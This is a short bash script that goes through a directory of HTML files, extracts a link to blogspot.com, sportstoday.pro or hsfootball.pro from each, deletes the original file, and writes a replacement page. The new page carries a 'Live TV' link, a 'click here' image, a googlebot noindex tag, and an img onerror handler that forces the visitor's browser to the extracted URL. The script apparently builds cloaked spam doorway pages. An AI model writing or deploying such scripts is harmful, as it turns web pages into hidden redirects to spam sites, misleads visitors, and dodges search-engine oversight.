#!/bin/bash

sudo find . -type f -name "*.html" | sed 's/\.\///g' > urllist.txt

file_list="urllist.txt"
while IFS= read -r file; do
    blogurl=$(cat "$file" | grep -oE 'https?://[^/]*(blogspot\.com|sportstoday\.pro|hsfootball\.pro)[^"]*' | head -1)

    echo "$blogurl"

    # Check if $blogurl contains "blogspot.com", "sportstoday.pro", or "hsfootball.pro"
    if [[ $blogurl == *"blogspot.com"* || $blogurl == *"sportstoday.pro"* || $blogurl == *"hsfootball.pro"* ]]; then
        sudo rm "$file"
        sudo sh -c "echo '<center><h1><a href=\"$blogurl\">Live TV</a></h1></center>' >> $file"
        sudo sh -c "echo '<center><a href=\"$blogurl\"><img src=\"https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif\"></a></center>' >> $file"
        sudo sh -c "echo '<meta name=\"googlebot\" content=\"noindex\">  <img src=\"0\" onerror= top.location.href=\"$blogurl\">' >> $file"
    else
        echo "====================>> No matching URL found. Skipping this line."
        continue
    fi

done < "$file_list"

sudo rm urllist.txt

